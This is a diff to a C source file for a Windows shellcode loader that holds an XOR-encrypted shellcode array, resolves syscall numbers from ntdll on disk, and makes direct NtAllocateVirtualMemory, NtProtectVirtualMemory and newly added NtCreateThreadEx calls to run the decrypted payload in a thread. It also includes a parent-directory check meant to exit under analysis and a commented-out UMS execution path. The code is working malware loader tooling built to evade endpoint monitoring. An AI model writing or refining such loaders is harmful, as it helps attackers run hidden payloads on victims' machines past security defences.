@@ -7,6 +7,7 @@ static unsigned char sc[] = "\x94\x27\xed\x81\x83\x9c\xa8\x6f\x6e\x65\x32\x25\x2
 
 DWORD g_NtAllocateVirtualMemorySyscall = 0;
 DWORD g_NtProtectVirtualMemorySyscall = 0;
+DWORD g_NtCreateThreadExSyscall = 0;
 
 
 void xor_decrypt(unsigned char* data, size_t data_len, const unsigned char* key, size_t key_len) {
@@ -15,72 +16,72 @@ void xor_decrypt(unsigned char* data, size_t data_len, const unsigned char* key,
     } 
 }
 
-void dircheck(const wchar_t* targetDir) {
-    wchar_t exePath[MAX_PATH];
-    wchar_t exeDir[MAX_PATH];
+void dircheck(const char* expectedName) {
+    char path[MAX_PATH];
+    char* lastSlash;
+    char* parentName;
 
-    // Get full path to current executable
-    if (!GetModuleFileNameW(NULL, exePath, MAX_PATH))
-        return FALSE;
+    // Get full path of current executable
+    if (!GetModuleFileNameA(NULL, path, MAX_PATH)) {
+        ExitProcess(1);
+    }
 
-    // Copy path so we can modify it
-    wcscpy_s(exeDir, MAX_PATH, exePath);
+    // Remove executable name
+    lastSlash = strrchr(path, '\\');
+    if (!lastSlash) {
+        ExitProcess(1);
+    }
+    *lastSlash = '\0';
 
-    // Strip filename → exeDir = "...\\parent"
-    wchar_t* lastSlash = wcsrchr(exeDir, L'\\');
-    if (!lastSlash)
-        return FALSE;
-    *lastSlash = L'\0';
+    // Find parent directory name
+    parentName = strrchr(path, '\\');
+    if (!parentName) {
+        ExitProcess(1);
+    }
+    parentName++; // move past '\'
 
-    // Find start of parent directory name
-    wchar_t* parentSlash = wcsrchr(exeDir, L'\\');
-    if (!parentSlash)
-        return FALSE;
-
-    // Compare only the directory name
-    BOOL b = _wcsicmp(parentSlash + 1, targetDir) == 0;
-
-    if (b == 0) {
-        exit(-1);
+    // Compare
+    if (_stricmp(parentName, expectedName) != 0) {
+        ExitProcess(1);
     }
 }
 
-void WINAPI UmsSchedulerProc(
-    UMS_SCHEDULER_REASON reason,
-    ULONG_PTR activationPayload,
-    PVOID schedulerParam
-) {
-    if (reason == UmsSchedulerThreadYield) {
-        // Shellcode yielded or exited
-        ExitThread(0);
-    }
-}
-
-void RunShellcodeUMS(void* shellcode) {
-    PUMS_COMPLETION_LIST cl = NULL;
-    PUMS_CONTEXT ctx = NULL;
-
-    CreateUmsCompletionList(&cl);
-
-    CreateUmsThreadContext(&ctx);
-
-    // Set shellcode as the UMS thread start
-    UmsThreadYield(ctx); // initializes context
-
-    // Manually patch RIP (documented trick)
-    CONTEXT c = { 0 };
-    c.ContextFlags = CONTEXT_CONTROL;
-    GetThreadContext(GetCurrentThread(), &c);
-    c.Rip = (DWORD64)shellcode;
-    SetThreadContext(GetCurrentThread(), &c);
-
-    UMS_SCHEDULER_STARTUP_INFO si = { 0 };
-    si.UmsVersion = UMS_VERSION;
-    si.CompletionList = cl;
-    si.SchedulerProc = UmsSchedulerProc;
-
-    EnterUmsSchedulingMode(&si);
-}
+//void WINAPI UmsSchedulerProc(
+//    UMS_SCHEDULER_REASON reason,
+//    ULONG_PTR activationPayload,
+//    PVOID schedulerParam
+//) {
+//    if (reason == UmsSchedulerThreadYield) {
+//        // Shellcode yielded or exited
+//        ExitThread(0);
+//    }
+//}
+//
+//void RunShellcodeUMS(void* shellcode) {
+//    PUMS_COMPLETION_LIST cl = NULL;
+//    PUMS_CONTEXT ctx = NULL;
+//
+//    CreateUmsCompletionList(&cl);
+//
+//    CreateUmsThreadContext(&ctx);
+//
+//    // Set shellcode as the UMS thread start
+//    UmsThreadYield(ctx); // initializes context
+//
+//    // Manually patch RIP (documented trick)
+//    CONTEXT c = { 0 };
+//    c.ContextFlags = CONTEXT_CONTROL;
+//    GetThreadContext(GetCurrentThread(), &c);
+//    c.Rip = (DWORD64)shellcode;
+//    SetThreadContext(GetCurrentThread(), &c);
+//
+//    UMS_SCHEDULER_STARTUP_INFO si = { 0 };
+//    si.UmsVersion = UMS_VERSION;
+//    si.CompletionList = cl;
+//    si.SchedulerProc = UmsSchedulerProc;
+//
+//    EnterUmsSchedulingMode(&si);
+//}
 
 
 DWORD GetSyscallFromDiskClassic(const char* name){
@@ -156,9 +157,11 @@ DWORD GetSyscallFromDisk(const char* name) {
 
 void InitSyscalls(){
     g_NtAllocateVirtualMemorySyscall = GetSyscallFromDiskClassic("NtAllocateVirtualMemory");
-    printf("NtAllocateVirtualMemory: %d", g_NtAllocateVirtualMemorySyscall);
+    printf("NtAllocateVirtualMemory: %d\n", g_NtAllocateVirtualMemorySyscall);
     g_NtProtectVirtualMemorySyscall = GetSyscallFromDiskClassic("NtProtectVirtualMemory");
-    printf("NtProtectVirtualMemory: %d", g_NtProtectVirtualMemorySyscall);
+    printf("NtProtectVirtualMemory: %d\n", g_NtProtectVirtualMemorySyscall);
+	g_NtCreateThreadExSyscall = GetSyscallFromDiskClassic("NtCreateThreadEx");
+    printf("NtCreateThreadEx: %d\n", g_NtCreateThreadExSyscall);
 }
 
 extern NTSTATUS NtAllocateVirtualMemory_syscall(
@@ -176,6 +179,20 @@ extern NTSTATUS NtProtectVirtualMemory_syscall(
     PSIZE_T RegionSize,
     ULONG NewProtect,
     PULONG OldProtect
+);
+
+extern NTSTATUS NtCreateThreadEx_syscall(
+    PHANDLE ThreadHandle,
+    ACCESS_MASK DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
+    HANDLE ProcessHandle,
+    PVOID StartRoutine,
+    PVOID Argument,
+    ULONG CreateFlags,
+    SIZE_T ZeroBits,
+    SIZE_T StackSize,
+    SIZE_T MaximumStackSize,
+    PVOID AttributeList
 );
 
 void* h_ntallocatevirtualmemory(SIZE_T size, ULONG protect){
@@ -198,19 +215,36 @@ void* h_ntallocatevirtualmemory(SIZE_T size, ULONG protect){
 }
 
 void h_ntprotectvirtualmemory(void* buf, SIZE_T size, ULONG newprotect, PULONG oldprotect) {
-
+    PVOID base = buf;
+	SIZE_T regionSize = size;
     NTSTATUS status = NtProtectVirtualMemory_syscall(
         GetCurrentProcess(),
-        (PVOID*)&buf,
-        &size,
+        &base,
+        &regionSize,
         newprotect,
         oldprotect
     );
 }
 
+void h_ntcreatethreadex(PHANDLE threadhandle, PVOID startroutine, PVOID argument) {
+    NTSTATUS status = NtCreateThreadEx_syscall(
+        threadhandle,
+        THREAD_ALL_ACCESS,
+        NULL,
+        GetCurrentProcess(),
+        startroutine,
+        argument,
+        FALSE,
+        0,
+        0,
+        0,
+        NULL
+    );
+}
+
 int main(void){
-    dircheck(L"build");
-    Sleep(8000);
+    dircheck("build");
+    //Sleep(8000);
     InitSyscalls();
     SIZE_T sc_size = sizeof(sc) - 1;
     char* buf = (char*)h_ntallocatevirtualmemory(sc_size, PAGE_READWRITE);
@@ -218,10 +252,6 @@ int main(void){
     if (!buf) {
         return -1;
     }
-
-    /*strcpy_s(buf, 0x1000, "Hello from syscall-backed allocator");
-    puts(buf);
-    fflush(stdout);*/
 
     memcpy(buf, sc, sc_size);
     //decrypt shellcode
@@ -231,14 +261,10 @@ int main(void){
    
     ULONG oldprotect;
     h_ntprotectvirtualmemory(buf, sc_size, PAGE_EXECUTE_READ, &oldprotect); 
-    MessageBoxA(NULL, "perms changed", "Debug", MB_OK);
 
-
-    // this is how you execute it 
-   /* void (*entry)() = (void (*)())buf;
-    entry();*/
-
-	RunShellcodeUMS(buf);
+    HANDLE hThread = NULL;
+	h_ntcreatethreadex(&hThread, buf, NULL);
+    WaitForSingleObject(hThread, INFINITE);
 
     return 0;
 }
